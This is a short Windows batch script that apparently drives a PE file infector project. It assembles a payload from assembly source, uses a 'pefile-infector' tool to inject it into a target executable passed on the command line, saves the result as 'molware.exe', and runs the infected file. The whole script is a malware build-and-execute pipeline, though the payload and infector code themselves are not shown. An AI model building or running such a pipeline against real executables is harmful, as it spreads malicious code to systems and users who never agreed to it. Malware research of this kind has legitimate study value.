@echo off
echo Location: %~dp0
echo Target: %~f1

set location=%~dp0
set target=%~f1
set cwd=%cd%

cd %location%/payload/dist
ml64.exe output.asm /link /entry:AlignRSP
%location%/cmake-build-debug/pefile-infector.exe %target% output.exe molware.exe
molware.exe
echo Process exited with error %ERRORLEVEL%
cd %cwd%